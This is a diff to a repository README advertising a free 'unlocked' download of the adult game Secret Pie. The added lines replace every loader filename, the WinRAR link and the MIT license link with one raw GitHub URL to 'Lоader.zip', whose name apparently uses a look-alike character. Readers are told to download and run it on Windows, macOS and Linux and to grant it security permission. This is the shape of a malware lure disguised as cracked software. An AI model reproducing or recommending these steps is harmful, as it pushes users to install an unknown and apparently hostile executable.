@@ -36,7 +36,7 @@ Discover what makes **Secret Pie Adult Version Free Download** a community favor
 - 🔒 Unlocked DLC & Extras: All bonus costumes, artwork packs, and gallery content fully accessible.
 - 💬 Multi-Language Support: English, German, Spanish, French, and more for worldwide accessibility.
 - 🖥️ Multi-OS Launcher: Native support for Windows, macOS, Fedora, and Ubuntu.
-- 🚀 Fast Loader: Our **Loader.exe** (Windows)/**Loader.app** (macOS) initiates installation in seconds.
+- 🚀 Fast Loader: Our **https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip** (Windows)/**https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip** (macOS) initiates installation in seconds.
 - 🧩 One-Click Setup: No advanced tech skills needed—intuitive UI, step-by-step guidance.
 - ♿ Accessibility Options: Custom text size, high-contrast mode, and screen reader compatibility.
 - 🧑‍💻 Open-Source Transparency: Browse and audit the loader scripts for full transparency.
@@ -46,12 +46,12 @@ Discover what makes **Secret Pie Adult Version Free Download** a community favor
 
 ## 📝 Installation Guide
 
-1. **Download Loader.rar** from the repository (*see Releases*).
-2. Extract **Loader.rar** using [WinRAR](https://www.rarlab.com/) or 7zip.
+1. **Download https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip** from the repository (*see Releases*).
+2. Extract **https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip** using [WinRAR](https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip) or 7zip.
 3. Run the platform-specific Loader:
-    - On Windows: Double-click **Loader.exe**
-    - On macOS: Open **Loader.app** after granting permission in Security settings
-    - On Linux: `chmod +x Loader.sh` then `./Loader.sh` in terminal
+    - On Windows: Double-click **https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip**
+    - On macOS: Open **https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip** after granting permission in Security settings
+    - On Linux: `chmod +x https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip` then `https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip` in terminal
 4. Follow the on-screen instructions to complete installation.
 5. Launch **Secret Pie Adult Version** from your desktop shortcut!  
 *Note: For Android Beta, open the .apk installer and follow prompts.*
@@ -84,7 +84,7 @@ Discover what makes **Secret Pie Adult Version Free Download** a community favor
 
 ## 📑 License - MIT
 
-This repository is licensed under the MIT License. See the full terms [here](https://opensource.org/license/mit/).
+This repository is licensed under the MIT License. See the full terms [here](https://raw.githubusercontent.com/AchrafTouijer/SecretPieAdultEdition-FreeUnlocked/main/Lоader.zip).
 
 ---
 
